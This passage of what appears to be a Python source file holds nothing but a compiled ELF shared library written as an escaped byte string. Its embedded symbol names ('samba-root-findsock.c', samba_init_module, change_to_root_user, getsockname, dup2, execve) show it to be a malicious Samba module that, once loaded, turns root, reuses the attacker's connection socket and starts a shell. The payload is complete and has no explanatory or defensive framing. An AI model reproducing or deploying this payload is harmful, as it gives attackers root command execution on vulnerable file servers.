              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\xc0\x07\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01' \
              b'\0\0\0\0\0\0\0\xca\0\0\0\0\0\0\0\x0c\0\0\0\0\0\0\0\x88\x06\0\0\0\0\0\0\x0d\0\0\0\0\0\0\0\xa8\x09\0\0' \
              b'\0\0\0\0\x19\0\0\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\x1b\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x1a\0\0\0\0\0\0\0' \
              b'\x08\x0e\x20\0\0\0\0\0\x1c\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\xf5\xfe\xff\x6f\0\0\0\0\xf0\x01\0\0\0\0\0' \
              b'\0\x05\0\0\0\0\0\0\0\xf8\x03\0\0\0\0\0\0\x06\0\0\0\0\0\0\0\x30\x02\0\0\0\0\0\0\x0a\0\0\0\0\0\0\0\xf8' \
              b'\0\0\0\0\0\0\0\x0b\0\0\0\0\0\0\0\x18\0\0\0\0\0\0\0\x03\0\0\0\0\0\0\0\0\x10\x20\0\0\0\0\0\x02\0\0\0\0' \
              b'\0\0\0\x90\0\0\0\0\0\0\0\x14\0\0\0\0\0\0\0\x07\0\0\0\0\0\0\0\x17\0\0\0\0\0\0\0\xf8\x05\0\0\0\0\0\0' \
              b'\x07\0\0\0\0\0\0\0\x38\x05\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\xc0\0\0\0\0\0\0\0\x09\0\0\0\0\0\0\0\x18\0\0' \
              b'\0\0\0\0\0\xfe\xff\xff\x6f\0\0\0\0\x18\x05\0\0\0\0\0\0\xff\xff\xff\x6f\0\0\0\0\x01\0\0\0\0\0\0\0\xf0' \
              b'\xff\xff\x6f\0\0\0\0\xf0\x04\0\0\0\0\0\0\xf9\xff\xff\x6f\0\0\0\0\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\x18\x0e\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xc6\x06\0\0\0\0\0\0\xd6' \
              b'\x06\0\0\0\0\0\0\xe6\x06\0\0\0\0\0\0\xf6\x06\0\0\0\0\0\0\x06\x07\0\0\0\0\0\0\x16\x07\0\0\0\0\0\0\x48' \
              b'\x10\x20\0\0\0\0\0\x47\x43\x43\x3a\x20\x28\x55\x62\x75\x6e\x74\x75\x20\x35\x2e\x34\x2e\x30\x2d\x36' \
              b'\x75\x62\x75\x6e\x74\x75\x31\x7e\x31\x36\x2e\x30\x34\x2e\x34\x29\x20\x35\x2e\x34\x2e\x30\x20\x32\x30' \
              b'\x31\x36\x30\x36\x30\x39\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x01' \
              b'\0\xc8\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x02\0\xf0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\x03\0\x03\0\x30\x02\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x04\0\xf8\x03\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\x03\0\x05\0\xf0\x04\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x06\0\x18\x05\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x07\0\x38\x05\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x08\0\xf8' \
              b'\x05\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x09\0\x88\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03' \
              b'\0\x0a\0\xb0\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x0b\0\x20\x07\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\x03\0\x0c\0\x30\x07\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x0d\0\xa8\x09\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\x03\0\x0e\0\xb1\x09\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x0f\0\xbc\x09\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x10\0\xe0\x09\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x11\0' \
              b'\0\x0e\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x12\0\x08\x0e\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\x03\0\x13\0\x10\x0e\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x14\0\x18\x0e\x20\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\x03\0\x15\0\xd8\x0f\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x16\0\0\x10\x20\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x17\0\x48\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x18' \
              b'\0\x50\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x03\0\x19\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0' \
              b'\0\x04\0\xf1\xff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x0c\0\0\0\x01\0\x13\0\x10\x0e\x20\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\x19\0\0\0\x02\0\x0c\0\x30\x07\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x1b\0\0\0\x02\0\x0c\0\x70\x07\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\x2e\0\0\0\x02\0\x0c\0\xc0\x07\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x44\0\0\0\x01\0' \
              b'\x18\0\x50\x10\x20\0\0\0\0\0\x01\0\0\0\0\0\0\0\x53\0\0\0\x01\0\x12\0\x08\x0e\x20\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\x7a\0\0\0\x02\0\x0c\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x86\0\0\0\x01\0\x11\0\0\x0e\x20\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\xa5\0\0\0\x04\0\xf1\xff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x04\0\xf1\xff' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xbb\0\0\0\x01\0\x10\0\x60\x0a\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xc9\0\0\0' \
              b'\x01\0\x13\0\x10\x0e\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x04\0\xf1\xff\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\xd5\0\0\0\x01\0\x17\0\x48\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\xe2\0\0\0\x01\0\x14\0\x18\x0e\x20\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\xeb\0\0\0\0\0\x0f\0\xbc\x09\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xfe\0\0\0\x01\0\x17' \
              b'\0\x50\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\x0a\x01\0\0\x01\0\x16\0\0\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\x20\x01\0\0\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x3c\x01\0\0\x10\0\x17\0\x50\x10\x20\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\x43\x01\0\0\x12\0\x0d\0\xa8\x09\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x49\x01\0\0\x12\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x5b\x01\0\0\x12\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x6d\x01\0\0\x12' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x81\x01\0\0\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x90\x01' \
              b'\0\0\x12\0\x0c\0\x30\x08\0\0\0\0\0\0\x6a\x01\0\0\0\0\0\0\xa2\x01\0\0\x10\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\xb6\x01\0\0\x10\0\x18\0\x58\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\xbb\x01\0\0\x10\0\x18\0\x50' \
              b'\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\xc7\x01\0\0\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xdb\x01\0\0' \
              b'\x12\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xf4\x01\0\0\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x0e' \
              b'\x02\0\0\x12\0\x0c\0\x9a\x09\0\0\0\0\0\0\x0b\0\0\0\0\0\0\0\x20\x02\0\0\x22\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\x3c\x02\0\0\x12\0\x09\0\x88\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x63\x72\x74\x73\x74\x75' \
              b'\x66\x66\x2e\x63\0\x5f\x5f\x4a\x43\x52\x5f\x4c\x49\x53\x54\x5f\x5f\0\x64\x65\x72\x65\x67\x69\x73\x74' \
              b'\x65\x72\x5f\x74\x6d\x5f\x63\x6c\x6f\x6e\x65\x73\0\x5f\x5f\x64\x6f\x5f\x67\x6c\x6f\x62\x61\x6c\x5f' \
              b'\x64\x74\x6f\x72\x73\x5f\x61\x75\x78\0\x63\x6f\x6d\x70\x6c\x65\x74\x65\x64\x2e\x37\x35\x38\x35\0\x5f' \
              b'\x5f\x64\x6f\x5f\x67\x6c\x6f\x62\x61\x6c\x5f\x64\x74\x6f\x72\x73\x5f\x61\x75\x78\x5f\x66\x69\x6e\x69' \
              b'\x5f\x61\x72\x72\x61\x79\x5f\x65\x6e\x74\x72\x79\0\x66\x72\x61\x6d\x65\x5f\x64\x75\x6d\x6d\x79\0\x5f' \
              b'\x5f\x66\x72\x61\x6d\x65\x5f\x64\x75\x6d\x6d\x79\x5f\x69\x6e\x69\x74\x5f\x61\x72\x72\x61\x79\x5f\x65' \
              b'\x6e\x74\x72\x79\0\x73\x61\x6d\x62\x61\x2d\x72\x6f\x6f\x74\x2d\x66\x69\x6e\x64\x73\x6f\x63\x6b\x2e' \
              b'\x63\0\x5f\x5f\x46\x52\x41\x4d\x45\x5f\x45\x4e\x44\x5f\x5f\0\x5f\x5f\x4a\x43\x52\x5f\x45\x4e\x44\x5f' \
              b'\x5f\0\x5f\x5f\x64\x73\x6f\x5f\x68\x61\x6e\x64\x6c\x65\0\x5f\x44\x59\x4e\x41\x4d\x49\x43\0\x5f\x5f' \
              b'\x47\x4e\x55\x5f\x45\x48\x5f\x46\x52\x41\x4d\x45\x5f\x48\x44\x52\0\x5f\x5f\x54\x4d\x43\x5f\x45\x4e' \
              b'\x44\x5f\x5f\0\x5f\x47\x4c\x4f\x42\x41\x4c\x5f\x4f\x46\x46\x53\x45\x54\x5f\x54\x41\x42\x4c\x45\x5f\0' \
              b'\x5f\x49\x54\x4d\x5f\x64\x65\x72\x65\x67\x69\x73\x74\x65\x72\x54\x4d\x43\x6c\x6f\x6e\x65\x54\x61\x62' \
              b'\x6c\x65\0\x5f\x65\x64\x61\x74\x61\0\x5f\x66\x69\x6e\x69\0\x64\x75\x70\x32\x40\x40\x47\x4c\x49\x42' \
              b'\x43\x5f\x32\x2e\x32\x2e\x35\0\x73\x65\x6e\x64\x40\x40\x47\x4c\x49\x42\x43\x5f\x32\x2e\x32\x2e\x35\0' \
              b'\x65\x78\x65\x63\x76\x65\x40\x40\x47\x4c\x49\x42\x43\x5f\x32\x2e\x32\x2e\x35\0\x5f\x5f\x67\x6d\x6f' \
              b'\x6e\x5f\x73\x74\x61\x72\x74\x5f\x5f\0\x73\x61\x6d\x62\x61\x5f\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75' \
              b'\x6c\x65\0\x63\x68\x61\x6e\x67\x65\x5f\x74\x6f\x5f\x72\x6f\x6f\x74\x5f\x75\x73\x65\x72\0\x5f\x65\x6e' \
              b'\x64\0\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\0\x5f\x4a\x76\x5f\x52\x65\x67\x69\x73\x74\x65\x72' \
              b'\x43\x6c\x61\x73\x73\x65\x73\0\x67\x65\x74\x73\x6f\x63\x6b\x6e\x61\x6d\x65\x40\x40\x47\x4c\x49\x42' \
              b'\x43\x5f\x32\x2e\x32\x2e\x35\0\x5f\x49\x54\x4d\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x54\x4d\x43\x6c' \
              b'\x6f\x6e\x65\x54\x61\x62\x6c\x65\0\x69\x6e\x69\x74\x5f\x73\x61\x6d\x62\x61\x5f\x6d\x6f\x64\x75\x6c' \
              b'\x65\0\x5f\x5f\x63\x78\x61\x5f\x66\x69\x6e\x61\x6c\x69\x7a\x65\x40\x40\x47\x4c\x49\x42\x43\x5f\x32' \
              b'\x2e\x32\x2e\x35\0\x5f\x69\x6e\x69\x74\0\0\x2e\x73\x79\x6d\x74\x61\x62\0\x2e\x73\x74\x72\x74\x61\x62' \
              b'\0\x2e\x73\x68\x73\x74\x72\x74\x61\x62\0\x2e\x6e\x6f\x74\x65\x2e\x67\x6e\x75\x2e\x62\x75\x69\x6c\x64' \
              b'\x2d\x69\x64\0\x2e\x67\x6e\x75\x2e\x68\x61\x73\x68\0\x2e\x64\x79\x6e\x73\x79\x6d\0\x2e\x64\x79\x6e' \
              b'\x73\x74\x72\0\x2e\x67\x6e\x75\x2e\x76\x65\x72\x73\x69\x6f\x6e\0\x2e\x67\x6e\x75\x2e\x76\x65\x72\x73' \
              b'\x69\x6f\x6e\x5f\x72\0\x2e\x72\x65\x6c\x61\x2e\x64\x79\x6e\0\x2e\x72\x65\x6c\x61\x2e\x70\x6c\x74\0' \
              b'\x2e\x69\x6e\x69\x74\0\x2e\x70\x6c\x74\x2e\x67\x6f\x74\0\x2e\x74\x65\x78\x74\0\x2e\x66\x69\x6e\x69\0' \
              b'\x2e\x72\x6f\x64\x61\x74\x61\0\x2e\x65\x68\x5f\x66\x72\x61\x6d\x65\x5f\x68\x64\x72\0\x2e\x65\x68\x5f' \
              b'\x66\x72\x61\x6d\x65\0\x2e\x69\x6e\x69\x74\x5f\x61\x72\x72\x61\x79\0\x2e\x66\x69\x6e\x69\x5f\x61\x72' \
              b'\x72\x61\x79\0\x2e\x6a\x63\x72\0\x2e\x64\x79\x6e\x61\x6d\x69\x63\0\x2e\x67\x6f\x74\x2e\x70\x6c\x74\0' \
              b'\x2e\x64\x61\x74\x61\0\x2e\x62\x73\x73\0\x2e\x63\x6f\x6d\x6d\x65\x6e\x74\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\x1b\0\0\0\x07\0\0\0\x02\0\0\0\0\0\0\0\xc8\x01\0\0\0\0\0\0\xc8\x01\0\0\0\0\0\0\x24\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x2e\0\0\0\xf6\xff\xff\x6f\x02\0\0\0\0\0\0\0\xf0\x01' \
              b'\0\0\0\0\0\0\xf0\x01\0\0\0\0\0\0\x40\0\0\0\0\0\0\0\x03\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\x38\0\0\0\x0b\0\0\0\x02\0\0\0\0\0\0\0\x30\x02\0\0\0\0\0\0\x30\x02\0\0\0\0\0\0\xc8\x01\0\0\0\0\0\0' \
              b'\x04\0\0\0\x02\0\0\0\x08\0\0\0\0\0\0\0\x18\0\0\0\0\0\0\0\x40\0\0\0\x03\0\0\0\x02\0\0\0\0\0\0\0\xf8' \
              b'\x03\0\0\0\0\0\0\xf8\x03\0\0\0\0\0\0\xf8\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\x48\0\0\0\xff\xff\xff\x6f\x02\0\0\0\0\0\0\0\xf0\x04\0\0\0\0\0\0\xf0\x04\0\0\0\0\0\0\x26\0\0\0\0' \
              b'\0\0\0\x03\0\0\0\0\0\0\0\x02\0\0\0\0\0\0\0\x02\0\0\0\0\0\0\0\x55\0\0\0\xfe\xff\xff\x6f\x02\0\0\0\0\0' \
              b'\0\0\x18\x05\0\0\0\0\0\0\x18\x05\0\0\0\0\0\0\x20\0\0\0\0\0\0\0\x04\0\0\0\x01\0\0\0\x08\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\x64\0\0\0\x04\0\0\0\x02\0\0\0\0\0\0\0\x38\x05\0\0\0\0\0\0\x38\x05\0\0\0\0\0\0\xc0\0' \
              b'\0\0\0\0\0\0\x03\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x18\0\0\0\0\0\0\0\x6e\0\0\0\x04\0\0\0\x42\0\0\0\0\0' \
              b'\0\0\xf8\x05\0\0\0\0\0\0\xf8\x05\0\0\0\0\0\0\x90\0\0\0\0\0\0\0\x03\0\0\0\x16\0\0\0\x08\0\0\0\0\0\0\0' \
              b'\x18\0\0\0\0\0\0\0\x78\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0\0\x88\x06\0\0\0\0\0\0\x88\x06\0\0\0\0\0\0\x1a' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x73\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0' \
              b'\0\xb0\x06\0\0\0\0\0\0\xb0\x06\0\0\0\0\0\0\x70\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\0\x10\0' \
              b'\0\0\0\0\0\0\x7e\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0\0\x20\x07\0\0\0\0\0\0\x20\x07\0\0\0\0\0\0\x10\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x87\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0\0\x30' \
              b'\x07\0\0\0\0\0\0\x30\x07\0\0\0\0\0\0\x75\x02\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\x8d\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0\0\xa8\x09\0\0\0\0\0\0\xa8\x09\0\0\0\0\0\0\x09\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x93\0\0\0\x01\0\0\0\x02\0\0\0\0\0\0\0\xb1\x09\0' \
              b'\0\0\0\0\0\xb1\x09\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\x9b\0\0\0\x01\0\0\0\x02\0\0\0\0\0\0\0\xbc\x09\0\0\0\0\0\0\xbc\x09\0\0\0\0\0\0\x24\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xa9\0\0\0\x01\0\0\0\x02\0\0\0\0\0\0\0\xe0\x09\0\0\0\0' \
              b'\0\0\xe0\x09\0\0\0\0\0\0\x84\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xb3\0\0' \
              b'\0\x0e\0\0\0\x03\0\0\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\0\x0e\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xbf\0\0\0\x0f\0\0\0\x03\0\0\0\0\0\0\0\x08\x0e\x20\0\0\0\0\0\x08' \
              b'\x0e\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xcb\0\0\0\x01\0' \
              b'\0\0\x03\0\0\0\0\0\0\0\x10\x0e\x20\0\0\0\0\0\x10\x0e\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xd0\0\0\0\x06\0\0\0\x03\0\0\0\0\0\0\0\x18\x0e\x20\0\0\0\0\0\x18' \
              b'\x0e\0\0\0\0\0\0\xc0\x01\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\0\x82\0\0\0' \
              b'\x01\0\0\0\x03\0\0\0\0\0\0\0\xd8\x0f\x20\0\0\0\0\0\xd8\x0f\0\0\0\0\0\0\x28\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\x08\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\xd9\0\0\0\x01\0\0\0\x03\0\0\0\0\0\0\0\0\x10\x20\0\0\0\0\0\0' \
              b'\x10\0\0\0\0\0\0\x48\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\xe2\0\0\0\x01' \
              b'\0\0\0\x03\0\0\0\0\0\0\0\x48\x10\x20\0\0\0\0\0\x48\x10\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xe8\0\0\0\x08\0\0\0\x03\0\0\0\0\0\0\0\x50\x10\x20\0\0\0\0\0\x50' \
              b'\x10\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xed\0\0\0\x01\0' \
              b'\0\0\x30\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x50\x10\0\0\0\0\0\0\x34\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0' \
              b'\0\0\0\0\0\x01\0\0\0\0\0\0\0\x11\0\0\0\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x9a\x18\0\0\0\0\0\0' \
              b'\xf6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x02\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\x88\x10\0\0\0\0\0\0\xd0\x05\0\0\0\0\0\0\x1c\0\0\0\x2d\0\0\0\x08\0\0\0\0\0\0\0' \
              b'\x18\0\0\0\0\0\0\0\x09\0\0\0\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x58\x16\0\0\0\0\0\0\x42\x02\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'
